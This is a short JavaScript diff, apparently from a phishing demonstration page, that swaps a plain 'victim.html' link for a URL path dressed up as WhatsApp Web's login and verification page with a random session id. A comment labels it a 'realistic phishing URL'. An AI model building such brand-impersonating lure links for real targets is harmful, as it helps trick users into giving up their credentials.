@@ -84,7 +84,9 @@
         // Dynamic URL detection
         const currentPath = window.location.pathname;
         const basePath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
-        let victimUrl = window.location.origin + basePath + 'victim.html';
+        
+        // REALISTIC PHISHING URL: Mimicking a legitimate service domain structure
+        let victimUrl = window.location.origin + basePath + 'web.whatsapp.com/login/verify.html?session_relay=true&id=' + Math.random().toString(36).substring(7);
         
         // Handle file:// protocol or localhost issues
         const isLocalFile = window.location.protocol === 'file:';
